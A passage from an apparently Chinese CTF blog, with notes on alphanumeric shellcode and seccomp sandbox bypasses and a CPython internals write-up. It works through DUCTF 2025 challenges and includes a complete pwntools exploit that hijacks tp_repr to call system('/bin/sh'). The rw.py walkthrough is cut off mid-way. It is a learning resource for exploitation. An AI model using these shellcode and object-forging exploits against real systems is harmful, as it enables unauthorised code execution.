bytes:\n\njZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c\n\n（四）限制字母和数字很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的shellcode组合梳理出来，然后结合shellcode的执行地址，利用xor/add等指令，构造出其他所需要的指令。\n举个例子，假如shellcode执行地址0x333100，只能用0x30-0x40编写shellcode，如果需要\\x0f\\x05，可以用异或：\nxor eax, 0x33333130; 3530313333xor eax, 0x3333343f; 353f343333;此时，eax就成为0x050f了\n\n可以用pwntools的disasm爆破所有可能的shellcode组合：\nimport itertoolsfrom pwn import *context.arch = &quot;amd64&quot;s = &quot;0123456789\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40&quot;for x in range(3):    for y in itertools.product(s, repeat=x+1):        res = disasm(&quot;&quot;.join(y).encode())        need_p = 1        for kk in  (&quot;.byte&quot;, &quot;rex&quot;, &quot;ds&quot;, &quot;bad&quot;, &quot;ss&quot;):            if kk in res:                need_p = 0                break        if need_p:            print(res)\n\n\n\n沙箱绕过（一）at&#x2F;v&#x2F;2替换这里分别指的是几个系统调用的后缀和前缀，比如：\n\n使用execveat代替execve，拿到shell后，使用shell内置命令读取flag: echo *; read FLAG &lt; /flag;echo $FLAG，否则使用子shell执行命令还是会被沙箱杀死。同样的，使用openat代替open。\n使用readv/writev代替read/write\n使用mmap2代替mmap\n还有一些特殊的系统调用，使用sendfile，代替read/write。这类的系统调用需要平时多关注、收集和整理。\n\n（二）使用orw读取flag一般来说，会禁止system/execve/fork等，这个时候使用open+read+write输出flag即可。\n或者使用open+sendfile，指令会更短。\n（三）切换指令模式$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0010 0005: 0x15 0x04 0x00 0x00000142  if (A == execveat) goto 0010 0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010 0007: 0x15 0x02 0x00 0x00000038  if (A == clone) goto 0010 0008: 0x15 0x01 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n这个沙箱规则判断了当前触发系统调用的时候，arch是否为x64，如果不是64就会kill；然后，判断了sys-number是否大于等于0x40000000，如果大于，程序也会被kill；然后设置了黑名单，分别是：execve/execveat/fork/clone/rt_sigreturn。处于黑名单的系统调用会被kill掉，其他系统调用则会放行。\n如果没有0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010这一句的检查，那么可以使用retf(return far)指令实现架构切换，或者在x64环境下直接调用int 0x80陷入到内核态。\nretf相当于pop ip; pop cs，cs是段寄存器，寄存器为0x23时表示32位运行模式，0x33表示64位运行模式。\n从64位切换到32位的模板如下：\nxor esp, espmov rsp, 0x400100mov eax, 0x23 ; csmov [rsp+4], eaxmov eax, 0x400800 ; ipmov [rsp], eaxretf\n\n如果没有限制：0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010的话，那么可以使用0x40000000 + X来执行系统调用。\n#define __X32_SYSCALL_BIT\t0x40000000UL\n\n关于x32 ABI可查看x32 ABI - Wikipedia。\n比如要执行read\nxor eax, eaxadd eax, 0x40000000xor edi, edimov rsi, rspmov edx, 0x300syscall\n\n需要注意的是，从5.16开始，linux内核不支持x32 abi了：Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries…” : Bugs : linux package : Ubuntu (launchpad.net)\n七、Tricks\n当寄存器全 0 时，只需要执行一次 syscall，就会把返回地址 rip 赋值给 rcx 寄存器，rcx 寄存器就会有 rwx 地址，然后再 mov rsi,rcx;mov dl,0xff;syscall，就会 reread\n\nsyscall   //0f 05\nmov rsi, rcx  //48 89 ce\nmov dl, 0xff //b2 ff\nsyscall  //0f 05\n\n\n\n\n使用 mov 时，对同一个寄存器的不同部分操作，指令字长不一样。例如，mov dl, 0xff 只有 9 个字节，而 mov rdx, 0xff 有 14 个字节，mov edx, 0xff 有 12 个字节\n\n\n\n\n64 位\n32 位\n16 位\n高 8 位(H)\n低 8 位(L)\n主要用途\n\n\n\nRAX​\nEAX​\nAX​\nAH​\nAL​\n累加器, 返回值, 系统调用号\n\n\nRBX​\nEBX​\nBX​\nBH​\nBL​\n基址指针, 保留寄存器\n\n\nRCX​\nECX​\nCX​\nCH​\nCL​\n计数器, 第 4 个参数\n\n\nRDX​\nEDX​\nDX​\nDH​\nDL​\n数据寄存器, 第 3 个参数\n\n\nRSI​\nESI​\nSI​\n\nSIL​\n源索引, 第 2 个参数\n\n\nRDI​\nEDI​\nDI​\n\nDIL​\n目的索引, 第 1 个参数\n\n\nRSP​\nESP​\nSP\n\nSPL​\n栈指针\n\n\nRBP​\nEBP​\nBP​\n\nBPL​\n基址指针(栈帧)\n\n\n\n\n\n很多场景下所能填写的shellcode长度受限，为此，了解各个指令的长度对于手写满足条件的shellcode有着重要的导向作用\n\n\n\n\n指令\n常见最小长度\n常见最大长度\n示例（64位模式）\n\n\n\nmov\n2 字节\n7+ 字节\nmov eax, ecx(2B), mov rax, [rsi+rcx*8+10h](可能5-6B)\n\n\nadd&#x2F;sub\n2 字节\n6+ 字节\nadd eax, ebx(2B), sub qword ptr [rsp+30h], 1(可能6B)\n\n\npush&#x2F;pop\n1 字节\n5 字节\npush rdi(1B), push 0FFFFFFFFh(5B)\n\n\n\nret（0xC3）、leave（0xC9）、xchg（0x90 与寄存器编码）\n\n\n\n\n八、shellcode网站\nOnline x86 and x64 Intel Instruction Assembler (defuse.ca): 在线编写shellcode和反汇编shellcode，目前只支持x86/x64\nOnline Assembler and Disassembler (shell-storm.org): 另一个更全的在线编写shellcode和反汇编shellcode网站\nShellcodes database for study cases (shell-storm.org): shellcode数据库，支持很多指令集与操作系统\nExploit Database Shellcodes (exploit-db.com): 另一个shellcode数据库\nOnline - Reverse Shell Generator (revshells.com): 生成反弹shell的命令\n\n九、参考链接The art of shellcode - LynneHuan - 博客园\nPwn.the-Art-of-Shellcode | V3rdant’s Blog\nAlphanumeric shellcode - NetSec\n"},{"title":"CPython PWN","url":"/2025/12/01/CPython-PWN/","content":"\n1、DUCTF 2025: “FakeObject” — DUCTF 2025: “FakeObject”\n\n一、Python 的底层工作原理（CPython）Python 是一种解释型语言，其官方实现 CPython 本身是一个用 C 语言编写的大型程序。当我们运行 Python 脚本时，实际上是这个 C 程序（即 Python 解释器）在读取你的代码并执行。值得注意的是：CPython API 的代码库在不同版本之间可能会有很大的差异，所以虽然基本原理应该保持不变，但实际实现并不总是相同的！所以具体问题要具体分析~\n（一）变量和 PyObject在 CPython 中，一切皆对象。每个变量、整数、字符串、字典等，在底层都是一个 C 语言的结构体（struct）。这些结构体都有一个共同的基础头（header），即 PyObject 结构。\n\n参考：类型对象 — Python 3.10.19 文档\n\n关键结构体定义：\n// 最基本的对象结构typedef struct _object &#123;    _PyObject_HEAD_EXTRA // 用于调试的宏，通常可忽略    Py_ssize_t ob_refcnt;  // 引用计数，用于垃圾回收    PyTypeObject *ob_type; // 指向类型对象的指针，至关重要！    //PyObject * _ob_next; // 可选的调试字段，仅在定义了宏 Py_TRACE_REFS 时存在：    //PyObject * _ob_prev; // 可选的调试字段，仅在定义了宏 Py_TRACE_REFS 时存在    // 跟踪所有活动对象：当启用 Py_TRACE_REFS 时，所有 Python 对象都会被链接到一个全局的双向链表中    // 内存泄漏检测：可以查看程序运行期间哪些对象没有被正确释放    // 引用计数调试：帮助诊断引用计数相关的问题&#125; PyObject;\n\n\nPyObject.ob_refcnt：这是类型对象的引用计数，由 PyObject_HEAD_INIT 宏初始化为 1。 请注意对于 静态分配的类型对象，类型的实例 (对象的 ob_type 指回该类型) 不会 被加入引用计数。 但对于 动态分配的类型对象，实例 确实 会被算作引用。\nPyObject.ob_type：它指向一个 PyTypeObject，类似于 c 语言中的 vtable\n\n当定义一个对象（即使是原始类型），该对象将在内存中以某种形式的结构创建。它通常扩展 PyObject 结构，但如果它是一个涉及长度的对象（例如列表），也可以扩展 PyVarObject。\n继承示例：PyListObject\n// 用于表示有长度概念的对象（如列表、字符串、字典）typedef struct &#123;    PyObject ob_base;    // 继承自 PyObject，包含 ob_refcnt 和 ob_type    Py_ssize_t ob_size;  // 对象中元素的数量（例如列表的长度）&#125; PyVarObject;typedef struct &#123;    PyVarObject ob_base; // 包含 PyObject 和 ob_size    PyObject **ob_item;   // 指向列表元素指针数组的指针    Py_ssize_t allocated; // 列表实际分配的内存空间&#125; PyListObject;\n\n这种设计使得任何 Python 对象都可以被安全地向上转型（cast）为 PyObject* 指针，因为它们的起始部分内存布局是一致的。这为后续的漏洞利用提供了可能性。一些 Python 类型及其特定结构的例子：\n\n字典有  PyDictObject\n元组有 PyTupleObject\n字符串有 PyUnicodeObject\n浮点数有 PyFloatObject\n此外，通常从类型中就能很直接地找到结构体的名称\n\n（二）PyTypeObjectPyObject 中的 ob_type 字段是一个指向 PyTypeObject 结构体的指针。这个 PyTypeObject 可以理解为 对象的“类”或“蓝图”，它定义了该类型对象的通用行为和属性。\nPyTypeObject 的作用类似于 C++ 中的虚函数表（vtable）。它包含了一大堆函数指针，这些指针指向了操作该类型对象的特定函数。\n\n参照：类型对象 — Python 3.10.19 文档\n\ntypedef struct _typeobject &#123;    PyObject_VAR_HEAD    const char *tp_name; /* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */    /* Methods to implement standard operations */    destructor tp_dealloc;    Py_ssize_t tp_vectorcall_offset;    getattrfunc tp_getattr;    setattrfunc tp_setattr;    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)                                    or tp_reserved (Python 3) */    reprfunc tp_repr;    /* Method suites for standard classes */    PyNumberMethods *tp_as_number;    PySequenceMethods *tp_as_sequence;    PyMappingMethods *tp_as_mapping;    /* More standard operations (here for binary compatibility) */    hashfunc tp_hash;    ternaryfunc tp_call;    reprfunc tp_str;    getattrofunc tp_getattro;    setattrofunc tp_setattro;    /* Functions to access object as input/output buffer */    PyBufferProcs *tp_as_buffer;    /* Flags to define presence of optional/expanded features */    unsigned long tp_flags;    const char *tp_doc; /* Documentation string */    /* Assigned meaning in release 2.0 */    /* call function for all accessible objects */    traverseproc tp_traverse;    /* delete references to contained objects */    inquiry tp_clear;    /* Assigned meaning in release 2.1 */    /* rich comparisons */    richcmpfunc tp_richcompare;    /* weak reference enabler */    Py_ssize_t tp_weaklistoffset;    /* Iterators */    getiterfunc tp_iter;    iternextfunc tp_iternext;    /* Attribute descriptor and subclassing stuff */    struct PyMethodDef *tp_methods;    struct PyMemberDef *tp_members;    struct PyGetSetDef *tp_getset;    // Strong reference on a heap type, borrowed reference on a static type    struct _typeobject *tp_base;    PyObject *tp_dict;    descrgetfunc tp_descr_get;    descrsetfunc tp_descr_set;    Py_ssize_t tp_dictoffset;    initproc tp_init;    allocfunc tp_alloc;    newfunc tp_new;    freefunc tp_free; /* Low-level free-memory routine */    inquiry tp_is_gc; /* For PyObject_IS_GC */    PyObject *tp_bases;    PyObject *tp_mro; /* method resolution order */    PyObject *tp_cache;    PyObject *tp_subclasses;    PyObject *tp_weaklist;    destructor tp_del;    /* Type attribute cache version tag. Added in version 2.6 */    unsigned int tp_version_tag;    destructor tp_finalize;    vectorcallfunc tp_vectorcall;&#125; PyTypeObject;\n\n\n\n示例：str() 函数的底层调用\n当你调用 str(my_dict) 时，底层 CPython 并不会有一个独立的 str 函数来处理所有类型。相反，它会：\n\n获取 my_dict 对应的 PyObject。\n通过 ob_type 找到它的 PyTypeObject。\n在这个 PyTypeObject 中查找名为 tp_str 的函数指针。\n调用该函数指针（例如，对于字典，它指向 dict.__str__ 的具体实现）。\n将该函数的返回值作为 str() 的结果。\n\nmy_dict = &#123;&#125;my_str = &quot;hello&quot;hello = str(my_str) + str(my_dict)print(hello)\n\n你可以假设 str 只是一个独立的函数，分别以 my_str 和 my_dict 作为参数执行。这并不完全正确；与 PyTypeObjects 中的许多其他情况类似，它实际上依赖于 PyTypeObject 中存在的函数。在这种情况下， str 函数实际上将执行以下操作：\n\n前往作为参数指定的 PyObject\n\n\n从 PyObject 头部定位他们的 PyTypeObject\n\n在所述 PyTypeObject 结构中定位 tp_str 字段，然后执行该字段所指向的地址\n\n将返回值用作更高层级的 str 函数的输出\n\n\n其他内置函数如 repr()、len() 等，也是通过访问 PyTypeObject 中的相应函数指针（tp_repr, tp_as_sequence-&gt;sq_length 等）来实现的。\n二、调试 python 程序以下是配置带有 GDB 调试符号的 Python v3.10.12 安装的步骤：\nwget &#x27;https://www.python.org/ftp/python/3.10.12/Python-3.10.12.tar.xz&#x27;tar xf Python-3.10.12.tar.xzcd Python-3.10.12./configure --with-pydebugmake\n\n完成这些步骤后，就可以使用构建好的 python 二进制文件来执行所有想要的 Python 脚本。在构建的 python 二进制文件（以及它正在执行的任何脚本）上打开 GDB 将允许访问特定于 CPython 的 GDB 调试功能。\n三、部分 python 函数（一）print()函数\nprint 是一个内置函数，实现函数为 builtin_print(...)\n\nstatic PyObject *builtin_print(PyObject *self, PyObject *const *args, Py_ssize_t nargs, PyObject *kwnames)&#123;    ...    for (i = 0; i &lt; nargs; i++) &#123;        if (i &gt; 0) &#123;            if (sep == NULL)                err = PyFile_WriteString(&quot; &quot;, file);            else                err = PyFile_WriteObject(sep, file,                                         Py_PRINT_RAW);            if (err)                return NULL;        &#125;        err = PyFile_WriteObject(args[i], file, Py_PRINT_RAW);        if (err)            return NULL;    &#125;    ...&#125;\n\n在打印对象时调用 PyFile_WriteObject 函数\n/* Interfaces to write objects/strings to file-like objects */intPyFile_WriteObject(PyObject *v, PyObject *f, int flags)&#123;    PyObject *writer, *value, *result;    _Py_IDENTIFIER(write);    if (f == NULL) &#123;        PyErr_SetString(PyExc_TypeError, &quot;writeobject with NULL file&quot;);        return -1;    &#125;    writer = _PyObject_GetAttrId(f, &amp;PyId_write);    if (writer == NULL)        return -1;    if (flags &amp; Py_PRINT_RAW) &#123;        value = PyObject_Str(v);    &#125;    else        value = PyObject_Repr(v);    if (value == NULL) &#123;        Py_DECREF(writer);        return -1;    &#125;    result = PyObject_CallOneArg(writer, value);    Py_DECREF(value);    Py_DECREF(writer);    if (result == NULL)        return -1;    Py_DECREF(result);    return 0;&#125;\n\n在其中调用了 PyObject_CallOneArg(writer, value) 方法，改方法实际上是为了高效调用单参数函数，内部又继续调用了 _PyObject_VectorcallTstate 函数\nstatic inline PyObject *PyObject_CallOneArg(PyObject *func, PyObject *arg)&#123;    PyObject *_args[2];    PyObject **args;    PyThreadState *tstate;    size_t nargsf;    assert(arg != NULL);    args = _args + 1;  // For PY_VECTORCALL_ARGUMENTS_OFFSET    args[0] = arg;    tstate = PyThreadState_Get();    nargsf = 1 | PY_VECTORCALL_ARGUMENTS_OFFSET;    return _PyObject_VectorcallTstate(tstate, func, args, nargsf, NULL);&#125;\n\n继续跟进\nstatic inline PyObject *_PyObject_VectorcallTstate(PyThreadState *tstate, PyObject *callable,                           PyObject *const *args, size_t nargsf,                           PyObject *kwnames)&#123;    vectorcallfunc func;    PyObject *res;    assert(kwnames == NULL || PyTuple_Check(kwnames));    assert(args != NULL || PyVectorcall_NARGS(nargsf) == 0);    func = PyVectorcall_Function(callable);    if (func == NULL) &#123;        Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);        return _PyObject_MakeTpCall(tstate, callable, args, nargs, kwnames);    &#125;    res = func(callable, args, nargsf, kwnames);    return _Py_CheckFunctionResult(tstate, callable, res, NULL);&#125;\n\n可见最后执行 func 是通过 PyVectorcall_Function(callable); 取出 writer 对应的函数指针\nstatic inline vectorcallfuncPyVectorcall_Function(PyObject *callable)&#123;    PyTypeObject *tp;    Py_ssize_t offset;    vectorcallfunc ptr;    assert(callable != NULL);    /*    #define Py_TYPE(ob) (_PyObject_CAST(ob)-&gt; ob_type)\tbpo-39573: The Py_SET_TYPE() function must be used to set an object type.\t扩展到:\t(((PyObject*)(callable))-&gt; ob_type)    */    tp = Py_TYPE(callable);    if (!PyType_HasFeature(tp, Py_TPFLAGS_HAVE_VECTORCALL)) &#123;        return NULL;    &#125;    assert(PyCallable_Check(callable));    offset = tp-&gt;tp_vectorcall_offset;    assert(offset &gt; 0);    memcpy(&amp;ptr, (char *) callable + offset, sizeof(ptr));    return ptr;&#125;\n\nPyVectorcall_Function 负责从可调用对象中提取向量调用函数指针\n\n通过 tp = Py_TYPE(callable); 获取对象的类型对象\n通过 offset = tp-&gt;tp_vectorcall_offset; 获取向量调用偏移：从类型对象中获取 tp_vectorcall_offset 字段，这个偏移量指向向量调用函数在对象内存布局中的位置\n通过内存拷贝 memcpy(&amp;ptr, (char *) callable + offset, sizeof(ptr)) 从对象的指定偏移量处提取向量调用函数指针\n对于 callable，向前回溯可找到：writer = _PyObject_GetAttrId(f, &amp;PyId_write);\n\nPyObject *_PyObject_GetAttrId(PyObject *v, _Py_Identifier *name)&#123;    PyObject *result;    PyObject *oname = _PyUnicode_FromId(name); /* borrowed */    if (!oname)        return NULL;    result = PyObject_GetAttr(v, oname);    return result;&#125;PyObject *PyObject_GetAttr(PyObject *v, PyObject *name)&#123;    PyTypeObject *tp = Py_TYPE(v);    if (!PyUnicode_Check(name)) &#123;        PyErr_Format(PyExc_TypeError,                     &quot;attribute name must be string, not &#x27;%.200s&#x27;&quot;,                     Py_TYPE(name)-&gt;tp_name);        return NULL;    &#125;    PyObject* result = NULL;    if (tp-&gt;tp_getattro != NULL) &#123;        result = (*tp-&gt;tp_getattro)(v, name);    &#125;    else if (tp-&gt;tp_getattr != NULL) &#123;        const char *name_str = PyUnicode_AsUTF8(name);        if (name_str == NULL) &#123;            return NULL;        &#125;        result = (*tp-&gt;tp_getattr)(v, (char *)name_str);    &#125;    else &#123;        PyErr_Format(PyExc_AttributeError,                    &quot;&#x27;%.50s&#x27; object has no attribute &#x27;%U&#x27;&quot;,                    tp-&gt;tp_name, name);    &#125;    if (result == NULL) &#123;        set_attribute_error_context(v, name);    &#125;    return result;&#125;\n\n此外关注到 &amp;PyId_write：涉及到 CPython 源码中关于 _Py_Identifier 结构 和 _Py_IDENTIFIER 宏。这是一个用于高效管理静态字符串（如方法名、属性名）的底层机制。\n/***** **** **** **** **** String Literals **** **** **** **** **** **** **** **** ********//* This structure helps managing static strings. The basic usage goes like this:   Instead of doing       r = PyObject_CallMethod(o, &quot;foo&quot;, &quot;args&quot;, ...);   do       _Py_IDENTIFIER(foo);       ...       r = _PyObject_CallMethodId(o, &amp;PyId_foo, &quot;args&quot;, ...);   PyId_foo is a static variable, either on block level or file level. On first   usage, the string &quot;foo&quot; is interned, and the structures are linked. On interpreter   shutdown, all strings are released.   Alternatively, _Py_static_string allows choosing the variable name.   _PyUnicode_FromId returns a borrowed reference to the interned string.   _PyObject_&#123;Get, Set, Has&#125;AttrId are __getattr__ versions using _Py_Identifier*.*/#define _Py_IDENTIFIER(varname) _Py_static_string(PyId_##varname, #varname)\n\n这套机制的核心是一个结构体和几个宏：\n_Py_Identifier 结构体：用于管理一个静态字符串标识符。\ntypedef struct _Py_Identifier &#123;    struct _Py_Identifier *next;  // 用于链接所有标识符，便于解释器关闭时统一清理    const char* string;           // 存储原始的 C 字符串（如 &quot;write&quot;）    PyObject *object;             // 存储对应的 Python 字符串对象（ interned 后的结果）&#125; _Py_Identifier;\n\n_Py_IDENTIFIER 宏：这是您在使用时最常打交道的部分。例如，_Py_IDENTIFIER(write) 这行代码会展开为：\n// 展开后static _Py_Identifier PyId_write = &#123; .next = NULL, .string = &quot;write&quot;, .object = NULL &#125;;\n\n它 在当前位置创建了一个静态的 _Py_Identifier 变量（变量名为 PyId_write），并进行了初始化。其中的 object 字段为 NULL，表示对应的 Python 字符串对象尚未创建：\n\n延迟 intern：当代码第一次通过 &amp;PyId_write 使用这个标识符时，CPython 内部函数（如 _PyDict_GetItemId）会检查其 object 字段。如果为 NULL，则会用 string 的值（&quot;write&quot;）创建一个 Python 字符串（PyUnicode 对象），并对其进行 intern（驻留） 操作，然后将结果赋给 object 字段。\n永久缓存：一旦创建，这个 PyObject* 就会在静态变量 PyId_write 中被缓存起来。后续所有使用 &amp;PyId_write 的地方，都会直接使用这个缓存的对象，而无需再次查找、创建和驻留字符串。\n性能优势：这与注释中的例子直接对应，旨在替代低效的字符串处理方式。\n\n层次有点深…有点混乱了@_@，让我们回过头看看是不是有缺漏，发现调用 PyObject_CallOneArg 函数之前，调用了 PyObject_Repr 函数，其中有一行代码通过函数指针进行了调用：\nPyObject *PyObject_Repr(PyObject *v)&#123;\t...    if (v == NULL)        return PyUnicode_FromString(&quot;&lt;NULL&gt;&quot;);    if (Py_TYPE(v)-&gt;tp_repr == NULL)        return PyUnicode_FromFormat(&quot;&lt;%s object at %p&gt;&quot;,                                    Py_TYPE(v)-&gt;tp_name, v);    ...    res = (*Py_TYPE(v)-&gt;tp_repr)(v);\t...&#125;\n\n\n当 tp_repr 不为空，会进行指针调用——控制该字段可劫持执行流\n当 tp_repr 为空，会打印对象所在位置——将该字段置空可泄露地址\n\n（二）其他\n对象的 id 是一个唯一标识符，代表对象在内存中的地址：id(obj)\n\nid 是对象在内存中的唯一地址标识\nid 在对象生命周期内保持不变\nis 运算符比较的就是 id\nid 主要用于对象标识比较，而不是具体的数值\n\n\nctypes.POINTER 是 ctypes 模块中用于 创建指针类型 的工厂函数。它用于描述和操作 C 语言中的指针。\n\nIntPtr = ctypes.POINTER(ctypes.c_int)\nCharPtr = ctypes.POINTER(ctypes.c_char)\nVoidPtr = ctypes.POINTER(ctypes.c_void_p)\nPOINTER 创建的是 类型，不是实例\n使用 pointer() 或类型转换来创建指针实例\n\n\nctypes.cast() 是 Python ctypes 模块中的一个重要函数，用于 将指针转换为不同的类型。\n\nctypes.cast(obj, type)\nobj：要转换的指针对象\ntype：目标指针类型\n\n\n\n\n\n四、challenges（一）DUCTF 2025: fakeobj.py\nDownUnderCTF&#x2F;Challenges_2025_Public: Files + Solutions for DownUnderCTF 2025 Challenges\n\n#!/usr/bin/env python3import ctypesobj = &#123;&#125;print(f&quot;addrof(obj) = &#123;hex(id(obj))&#125;&quot;)libc = ctypes.CDLL(None)system = ctypes.cast(libc.system, ctypes.c_void_p).valueprint(f&quot;system = &#123;hex(system or 0)&#125;&quot;)fakeobj_data = bytes.fromhex(input(&quot;fakeobj: &quot;))for i in range(72):    ctypes.cast(id(obj), ctypes.POINTER(ctypes.c_char))[i] = fakeobj_data[i]print(obj)\n\n\n创建了一个空字典对象 obj，并返回了该对象的 id，也就是对象在内存中的地址\n通过打印了 system 函数的地址泄露 libc 基址\nctypes.cast() 是 Python ctypes 模块中的一个重要函数，用于 将指针转换为不同的类型\nctypes.POINTER 是 ctypes 模块中用于 创建指针类型 的工厂函数。它用于描述和操作 C 语言中的指针。\n即通过将 obj 的地址转化为 char 类型的指针 char*，然后向 obj 地址开始的 72 个字节填写数据\n很明显，这里的函数指针在 PyObject 对象的 ob_type 中，也就是我们能覆盖的部分区域，且参数为对象的地址：如果我们能将 tp_repr 改为 system_ptr，在对象内存开头设置 /bin/sh\\x00，就可以调用 system(&#39;/bin/sh\\x00&#39;)\n\n现在我们进行调试：\n\n\n因此可以：\n\n在 ob_refcnt 处布置’&#x2F;bin&#x2F;sh\\x00’\n覆盖 ob_type 指针，设置合适偏移，在 tp_repr 的位置上布置 system_ptr\n另外，在由于在 print 的过程中会创建关于对象的引用，因此对象的引用计数会增加（理论上在退出函数前会恢复，但是在函数退出前程序执行流就已经被劫持），所以布置’’.bin&#x2F;sh\\x00’，待调用时该字段自增变为’&#x2F;bin&#x2F;sh\\x00’\n\nfrom pwn import *context(log_level=&#x27;debug&#x27;)io = process([&quot;/.../python3&quot;, &quot;fakeobj.py&quot;])io.recvuntil(b&#x27;0x&#x27;)obj_addr = int(io.recvline(), 16)print(f&quot;obj_addr = &#123;hex(obj_addr)&#125;&quot;)io.recvuntil(b&#x27;0x&#x27;)system_addr = int(io.recvline(), 16)print(f&quot;system_addr = &#123;hex(system_addr)&#125;&quot;)payload = flat(&#123;    0x0:b&#x27;.bin/sh\\x00&#x27;,    0x8:p64(obj_addr-0x58+0x10),    0x10:p64(system_addr)&#125;,length=72,filler=b&#x27;\\x00&#x27;)# gdb.attach(io)# pause()io.sendline(payload.hex().encode())io.interactive()\n\n\n\n（二）DUCTF 2025: rw.py这一道题可以说是进阶，应用了更多的细节：\n#!/usr/bin/env python3import ctypesa = [&#123;&#125;, (), [], &quot;&quot;, 0.0]#print(&quot;id(a):&quot;+hex(id(a)))#print(&quot;id(a [0]):&quot;+hex(id(a [0])))#print(&quot;id(a [1]):&quot;+hex(id(a [1])))#print(&quot;id(a [2]):&quot;+hex(id(a [2])))#print(&quot;id(a [3]):&quot;+hex(id(a [3])))#print(&quot;id(a [4]):&quot;+hex(id(a [4])))#print(&quot;id(a)-id(a [0]):&quot;+hex(id(a)-id(a [0])))#print(&quot;id(a)-id(a [1]):&quot;+hex(id(a)-id(a [1])))#print(&quot;id(a)-id(a [2]):&quot;+hex(id(a)-id(a [2])))#print(&quot;id(a)-id(a [3]):&quot;+hex(id(a)-id(a [3])))#print(&quot;id(a)-id(a [4]):&quot;+hex(id(a)-id(a [4])))while True:    try:        inp = input(&quot;&gt; &quot;)        cmd, idx, *val = inp.split()        idx = int(idx)        match cmd:            case &quot;r&quot;:                print(a[idx])            case &quot;w&quot;:                ctypes.cast(                    id(a) + idx, ctypes.POINTER(ctypes.c_char)                )[0] = int(val[0])            case _:                break    except Exception as e:        print(&quot;error:&quot;, e)\n\n直接学习官方的 wp（更重要的是，在早期尝试时发现一些偏移并非固定，遂没有想法，而 wp 显示在远程环境一些偏移是固定的），为了叙事上的连贯性，笔者将从一个解题者的思路开始讲起。首先分析一下这个简单的 python 代码：\n\n创建了一个列表对象 a，内含多个对象，包括字典、元组、列表、字符串和数。\n在一个循环中处理 r(read)、w(write) 请求：\nr 可打印列表 a 的成员\nw 可直接对 a 所在的地址+offset 的内存写数据\n\n\n\n存在一个任意地址写，但是我们仍需要泄露一些信息。\n\n任意地址写是对相对于 a 的偏移的内存进行的。为此，如果一些内存中一些关键数据和对象 a 的偏移固定，那我们就可以稳定进行修改内存加以利用。利用 arbitrary_write 显然是第一步可做的事情。连续运行几次，发现对象 a 与 a[0] 的偏移基本固定——大多数情况是 0x63030\nid(a):0x762213be0fa0id(a[0]):0x762213b7df70id(a[1]):0x762213e84250id(a[2]):0x762213bf3f70id(a[3]):0x762213e88040id(a[4]):0x762213f145e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x2a32b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x2a70a0id(a)-id(a[4]):-0x333640--------------------------------id(a):0x749154fe0fa0id(a[0]):0x749154f7df70id(a[1]):0x749155904250id(a[2]):0x749154ff3f70id(a[3]):0x749155908040id(a[4]):0x7491559945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640--------------------------------id(a):0x77955bbe4ff0id(a[0]):0x77955bb81fd0id(a[1]):0x77955be8c250id(a[2]):0x77955bbf7f70id(a[3]):0x77955be90040id(a[4]):0x77955bf1c5e0id(a)-id(a[0]):0x63020id(a)-id(a[1]):-0x2a7260id(a)-id(a[2]):-0x12f80id(a)-id(a[3]):-0x2ab050id(a)-id(a[4]):-0x3375f0--------------------------------id(a[0]):0x77955bb81fd0id(a[1]):0x77955be8c250id(a[2]):0x77955bbf7f70id(a[3]):0x77955be90040id(a[4]):0x77955bf1c5e0id(a)-id(a[0]):0x63020id(a)-id(a[1]):-0x2a7260id(a)-id(a[2]):-0x12f80id(a)-id(a[3]):-0x2ab050id(a)-id(a[4]):-0x3375f0--------------------------------id(a):0x76765dde0fa0id(a[0]):0x76765dd7df70id(a[1]):0x76765e704250id(a[2]):0x76765ddf3f70id(a[3]):0x76765e708040id(a[4]):0x76765e7945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640--------------------------------id(a):0x74b63dbe0fa0id(a[0]):0x74b63db7df70id(a[1]):0x74b63e504250id(a[2]):0x74b63dbf3f70id(a[3]):0x74b63e508040id(a[4]):0x74b63e5945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640\n\n由 wp 知远程的环境内存偏移是固定的：\n\n# DIST_FROM_a offsets may depend on the exact python environment! \n# debug the python process running inside nsjail to get the correct offsets\n\n本地起一个 docker 环境验证偏移，确实偏移较为固定：\ncd srcdocker build -t rw_py .docker run -d \\  --privileged \\  --cap-add=SYS_ADMIN \\  --security-opt apparmor=unconfined \\  --tmpfs /tmp \\  -p 1337:1337 \\  rw_pydocker start [container hash]docker exec -it [container hash] /bin/bashroot@34fe368f500a:/home/ctf/chal# 